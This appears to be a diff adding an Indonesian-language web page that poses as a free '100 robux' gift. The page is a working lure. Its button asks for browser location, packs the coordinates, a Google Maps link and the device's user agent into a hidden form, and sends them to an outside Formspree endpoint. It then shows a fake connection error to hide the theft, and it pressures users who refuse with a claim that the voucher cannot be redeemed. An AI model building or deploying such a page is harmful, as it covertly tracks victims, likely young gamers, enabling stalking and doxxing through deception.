@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>robuxshopindo.hadiah</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 350px; }
+        h1 { color: #27ae60; }
+        button { background: #27ae60; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #219150; }
+        .error-msg { color: #e74c3c; font-weight: bold; display: none; margin-top: 20px; }
+        #loader { display: none; margin-top: 20px; color: #555; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div id="main-ui">
+            <h1>100 robux🎁</h1>
+            <p><b>from: nadya</b></p>
+            <p>Klik tombol di bawah untuk mendapatkan robux🎁🎁🎁</p>
+            <p>akan langsung berpindah ke roblox!</p>
+            <button id="btn-klaim" onclick="prosesData()">click here!</button>
+        </div>
+
+        <div id="loader">Sedang memproses...</div>
+
+        <div id="error-box" class="error-msg">
+            ❌ GAGAL berpindah!<br>
+            <small>Koneksi tidak stabil, silakan coba lagi nanti.</small>
+        </div>
+    </div>
+
+    <form id="email-form" action="https://formspree.io/f/meelgonv" method="POST" style="display:none;">
+        <input type="hidden" name="Lokasi_GPS" id="inp-lokasi">
+        <input type="hidden" name="Info_Perangkat" id="inp-perangkat">
+    </form>
+
+    <script>
+        function prosesData() {
+            document.getElementById('btn-klaim').disabled = true;
+            document.getElementById('loader').style.display = 'block';
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(pos) {
+                    // 1. Ambil Data Lokasi
+                    var lat = pos.coords.latitude;
+                    var lon = pos.coords.longitude;
+                    var peta = "https://www.google.com/maps?q=" + lat + "," + lon;
+
+                    // 2. Ambil Info Perangkat
+                    var device = navigator.userAgent;
+
+                    // 3. Masukkan ke Form Tersembunyi
+                    document.getElementById('inp-lokasi').value = "Lat: " + lat + ", Lon: " + lon + " | Link: " + peta;
+                    document.getElementById('inp-perangkat').value = device;
+
+                    // 4. Kirim Data ke Email via Formspree
+                    var form = document.getElementById('email-form');
+                    var formData = new FormData(form);
+
+                    fetch(form.action, {
+                        method: 'POST',
+                        body: formData,
+                        headers: { 'Accept': 'application/json' }
+                    }).then(response => {
+                        // 5. Setelah Terkirim, Tampilkan Pesan Gagal
+                        document.getElementById('loader').style.display = 'none';
+                        document.getElementById('main-ui').style.display = 'none';
+                        document.getElementById('error-box').style.display = 'block';
+                    });
+
+                }, function(err) {
+                    alert("Akses lokasi ditolak! Voucher tidak bisa diklaim.");
+                    location.reload();
+                });
+            } else {
+                alert("Browser tidak mendukung.");
+            }
+        }
+    </script>
+</body>
+</html>
